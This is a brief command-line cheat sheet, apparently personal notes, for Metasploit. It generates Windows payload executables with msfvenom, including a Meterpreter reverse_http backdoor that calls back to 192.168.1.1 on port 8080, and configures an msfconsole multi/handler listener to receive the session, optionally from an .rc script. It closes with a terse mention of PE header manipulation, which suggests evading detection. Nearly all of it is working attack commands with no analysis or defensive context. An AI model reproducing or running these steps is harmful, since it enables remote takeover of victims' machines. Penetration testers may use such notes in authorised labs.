```
 $ msfvenom CMD=calc.exe -p windows/exec -f exe -o blip.exe
 
 $ msfvenom -p windows/meterpreter/reverse_http -f exe LHOST=192.168.1.1 LPORT=8080
 
 $ msfconsole
   > use exploit/multi/handler
   > set payload windows/meterpreter/reverse_http
   > set LHOST 192.168.1.1
   > set LPORT 8080
   > exploit

 alternative: put lines above in an .rc script and invoke with:
 $ msfconsole -r script.rc
 
 
 peexplorer peheader manipulation

```
